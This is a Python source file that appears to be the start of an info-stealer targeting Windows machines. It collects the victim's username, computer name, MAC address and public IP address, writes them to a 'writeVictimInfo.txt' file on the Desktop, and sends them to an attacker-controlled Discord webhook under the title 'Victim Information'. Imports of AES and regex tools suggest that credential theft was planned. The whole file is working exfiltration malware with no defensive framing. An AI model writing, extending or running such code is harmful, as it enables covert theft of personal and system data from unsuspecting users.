import os
import requests
from re import findall
from Crypto.Cipher import AES
from getmac import get_mac_address

from pathlib import Path
from dotenv import load_dotenv
dotenv_path= Path('env/.env')
load_dotenv(dotenv_path=dotenv_path)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

windows_enviroment={
    'appLocal':'LOCALAPPDATA',
    'appRoaming':'APPDATA',
    'computer_name':'COMPUTERNAME',
    'userPath':'HOMEPATH',
    'username':'USERNAME'
}

def get_computer_information():
    computer_user_name= os.getenv(key=windows_enviroment.get('username'))
    computer_name= os.getenv(key=windows_enviroment.get('computer_name'))
    computer_mac_address= get_mac_address()
    ip_address= requests.get('https://api.ipify.org?format=json').json()['ip']
    userprofile_path= os.path.join(os.environ["USERPROFILE"], "Desktop")
    userprofile_path= userprofile_path + r'\writeVictimInfo.txt'

    with open(userprofile_path, 'w+', encoding="utf-8") as inforead:
        mem_history= inforead.read()
        inforead.seek(0)
        inforead.write(f'\nUsername: {computer_user_name} \nComputer Name: {computer_name} \nComputer Mac Address: {computer_mac_address} \nIP Address: {ip_address}' + mem_history)

    discord_embeded={
        "title": "Victim Information", 
        "description": "Computer Info", 
        "color": 0, 
        "fields": [{ "name": "User","value": f"{computer_user_name}" },
            {"name": "Name","value": f"{computer_name}"},
            {"name": "Mac Addrr","value": f"{computer_mac_address}"},
            {"name": "IP Addrr","value": f"{ip_address}"}]
        }
    
    latest_jsondata = {
        "content": "" ,
        "username": f"{computer_user_name} | {computer_name}",
        "embeds": [discord_embeded],}
    
    requests.post(DISCORD_WEBHOOK_URL, json=latest_jsondata)
    # TODO: Check
